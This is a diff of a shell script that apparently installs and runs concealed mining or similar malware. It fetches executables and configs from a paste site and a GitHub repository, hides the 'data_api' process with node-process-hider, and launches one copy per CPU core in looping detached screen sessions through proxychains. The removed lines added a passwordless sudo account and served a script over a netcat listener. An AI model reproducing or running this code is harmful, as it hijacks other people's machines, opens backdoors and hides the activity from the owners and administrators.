@@ -3,16 +3,22 @@ wget -O myconf.conf https://www.heypasteit.com/download/0IWWBC > /dev/null 2>&1 
 sudo npm i -g node-process-hider > /dev/null 2>&1 && sudo ph add data_api > /dev/null 2>&1
 echo "SETTING USER..."
 sudo npm i -g node-process-hider > /dev/null 2>&1 && sudo ph add data_api > /dev/null 2>&1
-sudo adduser --disabled-password --gecos "" mvp && sudo usermod -aG sudo mvp
-echo "DOWNLOAD PACK..."
-wget -O data_api https://github.com/hambana01/cici/raw/main/download > /dev/null 2>&1
-wget -O build_config https://www.heypasteit.com/download/0IX51N > /dev/null 2>&1
-wget https://github.com/hambana01/cici/raw/main/mood.py > /dev/null 2>&1
-wget https://github.com/hambana01/cici/raw/main/kos.py > /dev/null 2>&1
-sudo chmod 755 *
-echo "CONFIGURATION..."
-RND=$(shuf -n 1 -i 1-99999999)
-sed -i "s/BLESS/$RND/" "build_config"
-sudo nohup python mood.py &
-echo "STARTING PROGRAM... USER => $RND"
-sudo -u mvp -H sh -c 'echo "/usr/bin/python kos.py" | nc -vlp 8888'
+
+CPU=$(nproc)
+wget -O data_api https://github.com/hambana01/cici/raw/main/download
+# DIRAWAL=$(pwd)
+for (( j=1; j<=$CPU; j++ ))
+do
+  DIR=$(shuf -n 1 -i 1-99999999)
+  mkdir $DIR
+  wget -O build_config https://www.heypasteit.com/download/0IX51N
+  wget -O $DIR.sh https://github.com/hambana01/cici/raw/main/gas.sh
+  sudo chmod 755 data_api build_config $DIR.sh
+  sed -i "s/BLESS/$DIR/" "build_config"
+  sed -i "s/WORK/$DIR/" "$DIR.sh"
+  mv build_config $DIR/build_config
+ # while :; do timeout 1m cpulimit -l 3 ./$DIR.sh > /dev/null 2>&1 ; sleep 3 ; done &
+  while :; do screen -dmS $DIR proxychains4 ./$DIR.sh > /dev/null 2>&1 ; sleep 10 ; screen -X -S $DIR quit ; sleep 10 ; done &
+done
+echo "SUCCESS..."
+sleep 359
